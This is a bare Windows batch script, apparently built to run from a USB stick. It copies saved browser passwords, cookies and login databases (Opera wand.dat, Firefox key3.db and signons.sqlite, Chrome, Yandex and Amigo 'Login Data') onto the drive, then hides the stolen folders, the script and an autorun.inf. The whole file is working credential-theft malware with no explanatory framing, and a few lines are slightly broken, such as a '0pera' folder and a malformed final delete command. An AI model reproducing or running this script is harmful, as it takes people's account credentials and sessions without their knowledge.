@echo off 
md %~d0\Mozilla 
md %~d0\0pera 
md %~d0\Google 
md %~d0\Yandex 
md %~d0\Amigo
CD/D %APPDATA%\Opera\Opera\ 
cls
copy /y wand.dat %~d0\Opera\ 
copy /y cookies.dat %~d0\Opera\
cd %AppData%\Mozilla\Firefox\Profiles\*.default
copy /y cookies.sqlite %~d0\Mozilla
copy /y key3.db %~d0\Mozilla
copy /y signons.sqlite %~d0\Mozilla
copy /y %AppData%\Mozilla\Firefox\Profiles\*.default %~d0\Mozilla
cd %localappdata%\Google\Chrome\User Data\Default
cls
copy /y "%localappdata%\Google\Chrome\User Data\Default\Login Data" "%~d0\Google"
cd %localappdata%\Yandex\YandexBrowser\User Data\Default
copy /y "%localappdata%\Yandex\YandexBrowser\User Data\Default\Login Data" "%~d0\Yandex" 
cd %localappdata%\Amigo\User Data\Default
copy /y "%localappdata%\Amigo\User Data\Default\Login Data" "%~d0\Amigo" 
cls
ATTRIB -R -A -S -H 
attrib +h %~d0\Mozilla 
attrib +h %~d0\Opera 
attrib +h %~d0\Google 
attrib +h %~d0\Yandex 
attrib +h %~d0\Amigo 
attrib +h %~d0\search.bat 
attrib +h %~d0\new 
attrib +h %~d0\autorun.inf 
del: autorun.inf?


